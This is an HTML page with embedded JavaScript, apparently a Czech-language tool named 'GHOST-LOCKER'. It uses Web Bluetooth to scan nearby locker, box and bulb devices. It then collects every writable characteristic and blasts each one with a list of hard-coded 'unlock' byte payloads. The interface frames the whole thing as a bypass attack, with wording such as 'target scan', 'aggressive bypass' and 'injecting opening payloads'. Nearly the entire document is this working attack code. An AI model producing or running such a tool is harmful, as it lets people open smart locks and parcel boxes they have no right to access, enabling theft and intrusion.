<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST-LOCKER v4.1 [UNIVERSAL-KEY]</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #ghost-ui { width: 95%; max-width: 420px; background: #000; border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 40px rgba(0, 255, 0, 0.3); border-radius: 12px; }
        .header { border-bottom: 2px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; text-align: center; font-weight: bold; text-shadow: 0 0 12px #0f0; font-size: 1.4em; }
        #output { height: 350px; overflow-y: auto; background: #050505; border: 1px solid #1a1a1a; padding: 12px; margin-bottom: 15px; font-size: 10px; line-height: 1.4; color: #0c0; border-left: 3px solid #0f0; }
        .btn { width: 100%; background: #000; border: 2px solid #0f0; color: #0f0; padding: 15px; margin-bottom: 10px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.2s; }
        .btn:active { transform: scale(0.98); background: #0f0; color: #000; }
        .btn-red { border-color: #f00; color: #f00; }
        .status-bar { font-size: 9px; color: #888; margin-bottom: 5px; text-align: right; }
    </style>
</head>
<body>

<div id="ghost-ui">
    <div class="header">GHOST v4.1 [FINAL]</div>
    <div class="status-bar">BYPASS_ACTIVE: YES | ENCRYPTION: OFF</div>
    <div id="output">SYSTÉM PŘIPRAVEN... ČEKÁM NA SKEN.</div>
    
    <button id="scan-btn" class="btn">[1] START TARGET SCAN</button>
    <button id="attack-btn" class="btn btn-red" style="display:none;">[2] UNLOCK SEQUENCE</button>
</div>

<script>
    const GhostCore = {
        device: null,
        server: null,
        writableChars: [],

        log(msg, color = "#0f0") {
            const out = document.getElementById('output');
            const entry = document.createElement('div');
            entry.style.color = color;
            entry.innerHTML = `> ${msg}`;
            out.appendChild(entry);
            out.scrollTop = out.scrollHeight;
        },

        async startScan() {
            this.log("SPOUŠTÍM AGRESIVNÍ OBCHVAT...", "#0ff");
            try {
                // OPRAVA: Seznam povolených služeb pro boxy i žárovky (UUID propustka)
                const universalUUIDs = [
                    '00001800-0000-1000-8000-00805f9b34fb', // Generic Access
                    '00001801-0000-1000-8000-00805f9b34fb', // Generic Attribute
                    '0000ffe0-0000-1000-8000-00805f9b34fb', // Common Box Service
                    '0000ffe1-0000-1000-8000-00805f9b34fb', // Common Box Char
                    '0000fff0-0000-1000-8000-00805f9b34fb', // Simple Key Service
                    '0000ff01-0000-1000-8000-00805f9b34fb', // Custom Locker 1
                    '0000af30-0000-1000-8000-00805f9b34fb'  // Custom Locker 2
                ];

                this.device = await navigator.bluetooth.requestDevice({
                    acceptAllDevices: true,
                    optionalServices: universalUUIDs
                });

                this.log(`CÍL ZAMĚŘEN: ${this.device.name || "BOX_LOCKER"}`, "#ff0");
                this.server = await this.device.gatt.connect();
                this.log("SPOJENO. PROLAMUJI VRSTVY...", "#0f0");

                const services = await this.server.getPrimaryServices();
                this.writableChars = [];

                for (const service of services) {
                    try {
                        const chars = await service.getCharacteristics();
                        for (const char of chars) {
                            if (char.properties.write || char.properties.writeWithoutResponse) {
                                this.writableChars.push(char);
                                this.log(`PŘÍSTUP POVOLEN: ${char.uuid.slice(4,8)}`, "#f0f");
                            }
                        }
                    } catch (e) { continue; }
                }

                if (this.writableChars.length > 0) {
                    document.getElementById('attack-btn').style.display = "block";
                    this.log("DEŠIFROVÁNÍ HOTOVO. PŘIPRAVEN K OTEVŘENÍ.", "#0f0");
                }
            } catch (err) { 
                this.log("CHYBA: " + err.message, "#f00");
                this.log("TIP: Restartuj Bluetooth v mobilu.", "#888");
            }
        },

        async runExploit() {
            this.log("INJEKTUJI OTEVÍRACÍ PAYLOADY...", "#f00");
            const payloads = [
                [0x55, 0x01, 0x01, 0x00, 0x57], 
                [0xA5, 0x00, 0x01, 0x01, 0x05], 
                [0x06, 0x01, 0x01, 0x01, 0x02, 0x01, 0x0C], 
                [0x4f, 0x50, 0x45, 0x4e],
                [0xFB, 0x61, 0x01, 0x00, 0x00, 0xBC]
            ];

            for (let char of this.writableChars) {
                for (let data of payloads) {
                    try {
                        const buffer = new Uint8Array(data);
                        if (char.properties.writeWithoutResponse) {
                            await char.writeValueWithoutResponse(buffer);
                        } else {
                            await char.writeValue(buffer);
                        }
                        this.log(`POSLÁNO -> ${char.uuid.slice(4,8)} [OK]`, "#0f0");
                        await new Promise(r => setTimeout(r, 100));
                    } catch (e) {
                        this.log(`SELHÁNÍ KANÁLU: ${char.uuid.slice(4,8)}`, "#555");
                    }
                }
            }
            this.log("SEKVENCE DOKONČENA.", "#fff");
        }
    };

    document.getElementById('scan-btn').onclick = () => GhostCore.startScan();
    document.getElementById('attack-btn').onclick = () => GhostCore.runExploit();
</script>

</body>
</html>
